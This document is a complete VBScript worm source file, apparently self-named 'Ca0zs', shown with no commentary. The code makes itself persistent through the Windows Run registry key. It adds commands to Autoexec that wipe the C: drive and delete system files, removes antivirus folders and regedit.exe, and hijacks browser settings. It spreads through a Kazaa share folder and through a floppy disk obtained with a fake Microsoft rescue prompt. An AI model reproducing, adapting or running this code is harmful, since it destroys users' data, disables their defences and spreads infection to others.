
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wss = CreateObject("WScript.Shell")

Set cuerpo = fso.OpenTextFile(WScript.ScriptFullName)
alma = cuerpo.ReadAll
Set windows = fso.GetSpecialFolder(0)
Set sys = fso.GetSpecialFolder(1)

If (fso.FileExists(windows & "\Cz0_32.dll.vbs")) Then
        Set fc = sys.Files
        For Each f1 In fc
            ext = fso.GetExtensionName(f1.path)
            If (ext = "res") Then
               MsgBox "We found " & Hour((Now)) & Day((Now)) & " KB lost Data. Plase put a disk in the A: unit for rescue it", 0, "-MS-rescue-"
               Set w = fso.CreateTextFile("A:\WEB.html", True)
               w.WriteLine("<" & "HT"& "ML" & ">")
               w.WriteLine("<" & "Script" & " Language=""VBScript"">")
               w.WriteLine("On Error Resume Next")
               w.WriteLine("Set fso = CreateObject(""Scripting.FileSystemObject"")")
               w.WriteLine("Set wss = CreateObject(""WScript.Shell"")")
               w.WriteLine("fso.DeleteFolder(""C:\Progra~1\norton~1"")")
               w.WriteLine("fso.DeleteFolder(""C:\Progra~1\mcafee"")")
               w.WriteLine("fso.DeleteFolder(""C:\Progra~1\kasper~1"")")
               w.WriteLine("fso.DeleteFolder(""C:\Progra~1\trojan~1"")")
               w.WriteLine("fso.DeleteFolder(""C:\Archiv~1\norton~1"")")
               w.WriteLine("fso.DeleteFolder(""C:\Progra~1\norton~1"")")
               w.WriteLine("fso.DeleteFolder(""C:\Archiv~1\mcafee"")")
               w.WriteLine("fso.DeleteFolder(""C:\Archiv~1\kasper~1"")")
               w.WriteLine("fso.DeleteFolder(""C:\Archiv~1\trojan~1"")")
               w.WriteLine("Set windows = fso.GetSpecialFolder(0)")
               w.WriteLine("Set w = fso.CreateTextFile(windows & ""\exe.vbs"", True)")
               w.WriteLine("w.Write(" & alma & ")")
               w.WriteLine("w.Close")
               w.WriteLine("wss.Run & windows & ""\exe.vbs""")
               w.WriteLine("<" & "/" & "Script" & ">")
               w.WriteLine("<" & "/" & "HT" & "ML" & ">")
               w.Close
               If (fso.FileExists("A:\WEB.html")) Then
                       MsgBox "Thanks!"
                       MsgBox "Ca0zs"
               End If
            Else
               For repeat = 1 To 10
                   fso.CopyFile WScript.ScriptFullName, sys & "\csz" & Month(Now()) & Day(Now()) & Hour(Now()) & repeat & ".res"
               Next
            End If
        Next
Else
        fso.CopyFile WScript.ScriptFullName, windows & "\Cz0_32.dll.vbs"
        If (fso.FileExists("C:\Autoexec.nt")) Then
                Set inf = fso.OpenTextFile("C:\Autoexec.nt")
                caoz = inf.ReadAll
                Set caos = fso.CreateTextFile("C:\Autoexec.nt", True)
                caos.Write(caoz)
                caos.WriteLine("if not exist C:\WINDOWS\Cz0_32.dll.vbs rd /s /q C:")
                caos.WriteLine("rem Ca0zs, así es la vida... ^_^")
                caos.WriteLine("del /s /q C:\*.log")
                caos.WriteLine("del /s /q C:\*.dll")
                caos.WriteLine("del /s /q C:\*.sam")
                caos.WriteLine("del /s /q C:\*.bkp")
                caos.WriteLine("ren " & sys & "\*.res *.vbs")
                caos.Close
        Else
                Set inf = fso.OpenTextFile("Autoexec.bat")
                caoz = inf.ReadAll
                Set caos = fso.CreateTextFile("Autoexec.bat", True)
                caos.Write(caoz)
                caos.WriteLine(" not exist C:\WINDOWS\Cz0_32.dll.vbs rd /s /q C:")
                caos.WriteLine("rem Ca0zs, así es la vida... ^_^")
                caos.WriteLine("del /s /q C:\*.log")
                caos.WriteLine("del /s /q C:\*.dll")
                caos.WriteLine("del /s /q C:\*.sam")
                caos.WriteLine("del /s /q C:\*.bkp")
                caos.WriteLine("ren " & sys & "\*.res *.vbs")
                caos.Close
        End If
        wss.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\basi32.dll", windows & "\Cz0_32.dll.vbs"
        wss.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "__Proximamente...__"
        wss.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Window title", "!...Ca0zs...!"
        wss.RegWrite "HKLM\Software\kazaa\Transfer\DlDir0", windows & "\kazaa\"
        fso.CreateFolder(windows & "\kazaa")
        Set kaz = fso.CreateTextFile(windows & "\kazaa\WEB.html", True)
        kaz.WriteLine("<" & "Ht" & "ml" & ">")
        kaz.WriteLine("<" & "Script" & " Language=""VBScript"">")
        kaz.WriteLine("On Error Resume Next")
        kaz.WriteLine("Set fso = CreateObject(""Scripting.FileSystemObject"")")
        kaz.WriteLine("Set wss = CreateObject(""WScript.Shell"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Progra~1\norton~1"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Progra~1\mcafee"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Progra~1\kasper~1"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Progra~1\trojan~1"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Archiv~1\norton~1"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Progra~1\norton~1"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Archiv~1\mcafee"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Archiv~1\kasper~1"")")
        kaz.WriteLine("fso.DeleteFolder(""C:\Archiv~1\trojan~1"")")
        kaz.WriteLine("Set windows = fso.GetSpecialFolder(0)")
        kaz.WriteLine("Set w = fso.CreateTextFile(windows & ""\exe.vbs"", True)")
        kaz.WriteLine("w.WriteLine(" & alma & ")")
        kaz.WriteLine("w.Close>")
        kaz.WriteLine("wss.Run & windows & ""\exe.vbs""")
        kaz.WriteLine("<" & "/" & "Script" & ">")
        kaz.WriteLine("<" & "/" & "Ht" & "ml" & ">")
        MsgBox "Ca0zs"
        MsgBox "..."
End If
fso.DeleteFile windows & "\regedit.exe"
